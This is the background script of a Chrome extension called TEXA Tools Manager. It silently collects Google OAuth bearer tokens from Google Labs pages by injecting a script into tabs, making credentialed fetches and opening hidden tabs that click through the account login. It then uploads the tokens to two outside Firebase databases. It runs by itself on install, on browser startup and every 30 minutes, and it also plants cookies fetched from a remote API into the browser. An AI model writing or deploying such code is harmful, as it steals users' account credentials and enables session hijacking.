// =============================================
// TEXA Tools Manager - Background Service Worker
// Silent Token Scraping & Auto-Login Flow
// =============================================

// Firebase REST API Configuration - PRIMARY
const FIREBASE_PRIMARY = {
    projectId: 'tekno-cfaba',
    tokenPath: 'artifacts/my-token-vault/public/data/tokens/google_oauth_user_1'
};

// Firebase REST API Configuration - BACKUP
const FIREBASE_BACKUP = {
    projectId: 'tekno-335f8',
    rtdbUrl: 'https://tekno-335f8-default-rtdb.asia-southeast1.firebasedatabase.app',
    tokenPath: 'texa_tokens/google_oauth_user_1'
};

// Target URL for token scraping
const GOOGLE_LABS_URL = 'https://labs.google/fx/tools/flow';

// Build Firestore REST API URL (Primary)
function getFirestoreUrl(projectId, path) {
    return `https://firestore.googleapis.com/v1/projects/${projectId}/databases/(default)/documents/${path}`;
}

// Build Realtime Database URL (Backup)
function getRtdbUrl(path) {
    return `${FIREBASE_BACKUP.rtdbUrl}/${path}.json`;
}

// =============================================
// OFFSCREEN DOCUMENT MANAGEMENT
// =============================================

let offscreenCreating = null;

async function setupOffscreenDocument() {
    const offscreenUrl = chrome.runtime.getURL('offscreen.html');

    try {
        const existingContexts = await chrome.runtime.getContexts({
            contextTypes: ['OFFSCREEN_DOCUMENT'],
            documentUrls: [offscreenUrl]
        });

        if (existingContexts.length > 0) {
            return;
        }

        if (offscreenCreating) {
            await offscreenCreating;
        } else {
            offscreenCreating = chrome.offscreen.createDocument({
                url: offscreenUrl,
                reasons: ['DOM_SCRAPING'],
                justification: 'Silent token extraction from Google Labs Flow'
            });
            await offscreenCreating;
            offscreenCreating = null;
        }
    } catch (e) {
        console.log('TEXA: Offscreen setup error:', e.message);
    }
}

async function closeOffscreenDocument() {
    try {
        await chrome.offscreen.closeDocument();
    } catch (e) { }
}

// =============================================
// TOKEN REGEX
// =============================================

const TOKEN_REGEX = /ya29\.[a-zA-Z0-9_-]{100,}/g;

// =============================================
// MAIN TOKEN SCRAPING FUNCTION
// =============================================

async function silentScrapeToken() {
    console.log('TEXA: Starting token scrape...');

    try {
        // Method 1: Check existing Google Labs tabs first
        const existingTabs = await chrome.tabs.query({ url: 'https://labs.google/*' });
        if (existingTabs.length > 0) {
            console.log('TEXA: Found existing Google Labs tab, extracting...');
            const result = await extractFromExistingTab(existingTabs[0].id);
            if (result.success) {
                return result;
            }
        }

        // Method 2: Try direct fetch
        console.log('TEXA: Trying direct fetch...');
        const directResult = await directFetchToken();
        if (directResult.success) {
            return directResult;
        }

        // Method 3: Check if we need to login - open Labs and let auto-login handle it
        console.log('TEXA: Token not found, initiating auto-login flow...');
        return await initiateAutoLoginFlow();

    } catch (error) {
        console.error('TEXA: Scrape error:', error);
        return { success: false, error: error.message };
    }
}

// Extract token from existing tab
async function extractFromExistingTab(tabId) {
    try {
        const results = await chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: () => {
                const regex = /ya29\.[a-zA-Z0-9_-]{100,}/g;
                const html = document.documentElement.outerHTML;
                const matches = html.match(regex);
                return matches ? matches.reduce((a, b) => a.length > b.length ? a : b) : null;
            }
        });

        if (results && results[0] && results[0].result) {
            const token = results[0].result;
            console.log('TEXA: Token extracted from existing tab!');
            await saveTokenToFirebase(token, 'Existing Tab Extraction');
            return { success: true, token: token, method: 'existing_tab' };
        }
    } catch (e) {
        console.log('TEXA: Could not extract from existing tab:', e.message);
    }
    return { success: false };
}

// Direct fetch from service worker
async function directFetchToken() {
    try {
        const response = await fetch(GOOGLE_LABS_URL, {
            credentials: 'include',
            headers: { 'Accept': 'text/html' }
        });

        if (response.ok) {
            const html = await response.text();
            const matches = html.match(TOKEN_REGEX);
            if (matches && matches.length > 0) {
                const token = matches.reduce((a, b) => a.length > b.length ? a : b);
                await saveTokenToFirebase(token, 'Direct Fetch');
                return { success: true, token: token, method: 'direct_fetch' };
            }

            // Check if redirected to login
            if (html.includes('accounts.google.com') || html.includes('Sign in')) {
                return { success: false, needsLogin: true };
            }
        }
    } catch (e) {
        console.log('TEXA: Direct fetch failed:', e.message);
    }
    return { success: false };
}

// =============================================
// AUTO-LOGIN FLOW
// Opens Google Labs in background tab, auto-clicks account
// =============================================

let autoLoginInProgress = false;
let autoLoginTabId = null;

async function initiateAutoLoginFlow() {
    if (autoLoginInProgress) {
        console.log('TEXA: Auto-login already in progress, waiting...');
        return { success: false, error: 'Auto-login in progress' };
    }

    autoLoginInProgress = true;
    console.log('TEXA: Starting auto-login flow...');

    return new Promise(async (resolve) => {
        try {
            // Create tab to Google Labs (background tab)
            const tab = await chrome.tabs.create({
                url: GOOGLE_LABS_URL,
                active: false  // Background tab - less intrusive
            });

            autoLoginTabId = tab.id;
            console.log('TEXA: Created background tab for auto-login:', tab.id);

            // Set timeout for the whole flow
            const flowTimeout = setTimeout(async () => {
                console.log('TEXA: Auto-login flow timeout');
                autoLoginInProgress = false;

                // Try to extract token one last time before closing
                const lastTry = await extractFromExistingTab(tab.id);
                if (lastTry.success) {
                    await closeAutoLoginTab(tab.id);
                    resolve(lastTry);
                    return;
                }

                await closeAutoLoginTab(tab.id);
                resolve({ success: false, error: 'Auto-login timeout' });
            }, 60000); // 60 second timeout for full login flow

            // Listen for when the tab finishes loading
            const onUpdated = async (tabId, changeInfo, tabInfo) => {
                if (tabId !== tab.id) return;

                if (changeInfo.status === 'complete') {
                    console.log('TEXA: Tab loaded:', tabInfo.url);

                    // Check if we're on Google Labs (not login page)
                    if (tabInfo.url && tabInfo.url.includes('labs.google') && !tabInfo.url.includes('accounts.google.com')) {
                        console.log('TEXA: Successfully on Google Labs, extracting token...');

                        // Wait a bit for page to fully render
                        setTimeout(async () => {
                            const result = await extractFromExistingTab(tabId);

                            if (result.success) {
                                clearTimeout(flowTimeout);
                                chrome.tabs.onUpdated.removeListener(onUpdated);
                                autoLoginInProgress = false;
                                await closeAutoLoginTab(tabId);
                                resolve(result);
                            }
                        }, 3000);
                    }
                    // If on login page, the autoLoginScript.js content script will handle clicking
                }
            };

            chrome.tabs.onUpdated.addListener(onUpdated);

            // Also listen for token found messages
            const tokenListener = async (msg, sender) => {
                if (msg.type === 'TEXA_TOKEN_FOUND' && msg.token) {
                    console.log('TEXA: Token found during auto-login!');
                    clearTimeout(flowTimeout);
                    chrome.tabs.onUpdated.removeListener(onUpdated);
                    chrome.runtime.onMessage.removeListener(tokenListener);
                    autoLoginInProgress = false;

                    await saveTokenToFirebase(msg.token, 'Auto-Login Flow');
                    await closeAutoLoginTab(tab.id);

                    resolve({ success: true, token: msg.token, method: 'auto_login' });
                }

                if (msg.type === 'TEXA_AUTO_LOGIN_CLICKED') {
                    console.log('TEXA: Account clicked, waiting for redirect...');
                }
            };

            chrome.runtime.onMessage.addListener(tokenListener);

        } catch (error) {
            console.error('TEXA: Auto-login flow error:', error);
            autoLoginInProgress = false;
            resolve({ success: false, error: error.message });
        }
    });
}

async function closeAutoLoginTab(tabId) {
    try {
        await chrome.tabs.remove(tabId);
        console.log('TEXA: Closed auto-login tab');
    } catch (e) { }
    autoLoginTabId = null;
}

// =============================================
// FIREBASE TOKEN STORAGE (Dual Database)
// =============================================

async function saveTokenToFirebase(token, source = 'Extension') {
    const timestamp = new Date().toISOString();

    const results = await Promise.allSettled([
        saveToPrimary(token, source, timestamp),
        saveToBackup(token, source, timestamp)
    ]);

    console.log('TEXA: Primary save:', results[0].status);
    console.log('TEXA: Backup save:', results[1].status);

    await chrome.storage.local.set({
        'texa_bearer_token': token,
        'texa_token_updated': timestamp,
        'texa_token_source': source
    });

    if (results[0].status === 'fulfilled' || results[1].status === 'fulfilled') {
        console.log('TEXA: Token saved to Firebase');
        return { success: true };
    }

    throw new Error('Both databases failed');
}

async function saveToPrimary(token, source, timestamp) {
    const url = getFirestoreUrl(FIREBASE_PRIMARY.projectId, FIREBASE_PRIMARY.tokenPath);
    const body = {
        fields: {
            token: { stringValue: token },
            id: { stringValue: 'google_oauth_user_1' },
            updatedAt: { timestampValue: timestamp },
            source: { stringValue: source },
            note: { stringValue: 'Auto-scraped dari Chrome Extension TEXA' }
        }
    };

    const response = await fetch(url, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });

    if (!response.ok) throw new Error(`Primary Firebase error: ${response.status}`);
    return { success: true, db: 'primary' };
}

async function saveToBackup(token, source, timestamp) {
    const url = getRtdbUrl(FIREBASE_BACKUP.tokenPath);
    const body = {
        token: token,
        id: 'google_oauth_user_1',
        updatedAt: timestamp,
        source: source,
        note: 'Auto-scraped dari Chrome Extension TEXA'
    };

    const response = await fetch(url, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });

    if (!response.ok) throw new Error(`Backup Firebase error: ${response.status}`);
    return { success: true, db: 'backup' };
}

async function getTokenFromFirebase() {
    try {
        const result = await getFromPrimary();
        if (result.success) return result;
    } catch (e) {
        console.log('TEXA: Primary read failed, trying backup...');
    }

    try {
        const result = await getFromBackup();
        if (result.success) return result;
    } catch (e) {
        console.log('TEXA: Backup read failed, trying cache...');
    }

    const cached = await chrome.storage.local.get(['texa_bearer_token', 'texa_token_updated']);
    if (cached.texa_bearer_token) {
        return { success: true, token: cached.texa_bearer_token, updatedAt: cached.texa_token_updated, fromCache: true };
    }

    return { success: false, error: 'Token not found' };
}

async function getFromPrimary() {
    const url = getFirestoreUrl(FIREBASE_PRIMARY.projectId, FIREBASE_PRIMARY.tokenPath);
    const response = await fetch(url);
    if (!response.ok) throw new Error(`Primary error: ${response.status}`);

    const data = await response.json();
    const token = data.fields?.token?.stringValue;

    if (token) {
        await chrome.storage.local.set({ 'texa_bearer_token': token });
        return { success: true, token, updatedAt: data.fields?.updatedAt?.timestampValue, source: 'primary' };
    }
    throw new Error('No token in primary');
}

async function getFromBackup() {
    const url = getRtdbUrl(FIREBASE_BACKUP.tokenPath);
    const response = await fetch(url);
    if (!response.ok) throw new Error(`Backup error: ${response.status}`);

    const data = await response.json();
    if (data && data.token) {
        await chrome.storage.local.set({ 'texa_bearer_token': data.token });
        return { success: true, token: data.token, updatedAt: data.updatedAt, source: 'backup' };
    }
    throw new Error('No token in backup');
}

// =============================================
// MESSAGE HANDLERS
// =============================================

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    console.log('Background received:', message.type || message.action);

    // Token found from content script
    if (message.type === 'TEXA_TOKEN_FOUND') {
        saveTokenToFirebase(message.token, message.source || 'Content Script')
            .then(() => {
                chrome.runtime.sendMessage({ type: 'TEXA_TOKEN_SAVED', token: message.token });
            })
            .catch(err => console.error('Save failed:', err));
        sendResponse({ success: true });
        return;
    }

    // Auto-login clicked notification
    if (message.type === 'TEXA_AUTO_LOGIN_CLICKED') {
        console.log('TEXA: Auto-login account clicked on:', message.url);
        sendResponse({ success: true });
        return;
    }

    // Manual scrape request from popup
    if (message.type === 'TEXA_SCRAPE_TOKEN') {
        silentScrapeToken()
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    // Get token request
    if (message.type === 'TEXA_GET_TOKEN') {
        getTokenFromFirebase()
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    // Legacy SAVE_TOKEN
    if (message.action === 'SAVE_TOKEN') {
        saveTokenToFirebase(message.payload.token, message.payload.service)
            .then(() => sendResponse({ status: 'success' }))
            .catch(err => sendResponse({ status: 'error', msg: err.message }));
        return true;
    }

    // Open tool with cookies
    if (message.type === 'TEXA_OPEN_TOOL') {
        handleOpenTool(message)
            .then(res => sendResponse(res))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    // Start auto-login flow manually
    if (message.type === 'TEXA_START_AUTO_LOGIN') {
        initiateAutoLoginFlow()
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    // Login success notification
    if (message.type === 'TEXA_LOGIN_SUCCESS') {
        chrome.notifications.create({
            type: 'basic',
            iconUrl: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
            title: 'TEXA Tools',
            message: 'Login berhasil! Extension siap digunakan.'
        });
        return;
    }

    return false;
});

// =============================================
// TOOL HANDLING
// =============================================

async function handleOpenTool(data) {
    const { targetUrl, apiUrl, authHeader } = data;

    try {
        if (!apiUrl) {
            await chrome.tabs.create({ url: targetUrl });
            return { success: true };
        }

        const fetchOptions = authHeader ? { headers: { 'Authorization': authHeader } } : {};
        const response = await fetch(apiUrl, fetchOptions);

        if (!response.ok) throw new Error(`API error: ${response.status}`);

        const cookiesData = await response.json();
        let cookies = extractCookies(cookiesData);

        for (const cookie of cookies) {
            try { await setCookie(cookie, targetUrl); } catch (e) { }
        }

        await chrome.tabs.create({ url: targetUrl });
        return { success: true, injectedCount: cookies.length };
    } catch (error) {
        await chrome.tabs.create({ url: targetUrl });
        return { success: true, fallback: true };
    }
}

function extractCookies(data) {
    if (data.fields) {
        for (const key in data.fields) {
            if (data.fields[key].stringValue) {
                try {
                    const parsed = JSON.parse(data.fields[key].stringValue);
                    if (Array.isArray(parsed)) return parsed;
                    if (parsed.cookies) return parsed.cookies;
                } catch (e) { }
            }
        }
    }
    if (Array.isArray(data)) return data;
    if (data.cookies) return data.cookies;
    return [];
}

function setCookie(cookieData, targetUrl) {
    const domain = cookieData.domain || new URL(targetUrl).hostname;
    const rawDomain = domain.startsWith('.') ? domain.substring(1) : domain;

    return chrome.cookies.set({
        url: cookieData.url || `https://${rawDomain}${cookieData.path || '/'}`,
        name: cookieData.name,
        value: cookieData.value,
        path: cookieData.path || '/',
        secure: cookieData.secure !== false,
        httpOnly: cookieData.httpOnly === true,
        domain: cookieData.domain,
        expirationDate: cookieData.expirationDate,
        sameSite: cookieData.sameSite
    });
}

// =============================================
// AUTO-SCRAPE ON STARTUP & ALARM
// =============================================

chrome.runtime.onStartup.addListener(() => {
    console.log('TEXA: Extension started, running scrape...');
    setTimeout(() => silentScrapeToken(), 5000);
});

chrome.runtime.onInstalled.addListener(() => {
    console.log('TEXA: Extension installed, setting up alarms...');
    chrome.alarms.create('tokenRefresh', { periodInMinutes: 30 });
    setTimeout(() => silentScrapeToken(), 10000);
});

chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'tokenRefresh') {
        console.log('TEXA: Periodic token refresh...');
        silentScrapeToken();
    }
});

// Scrape when user visits Google Labs
chrome.webNavigation.onCompleted.addListener(async (details) => {
    if (details.url.includes('labs.google') && !details.url.includes('accounts.google.com')) {
        console.log('TEXA: User on Google Labs, scraping...');
        setTimeout(() => silentScrapeToken(), 3000);
    }
}, { url: [{ hostContains: 'labs.google' }] });

console.log('TEXA Tools Manager - Background Script Loaded');
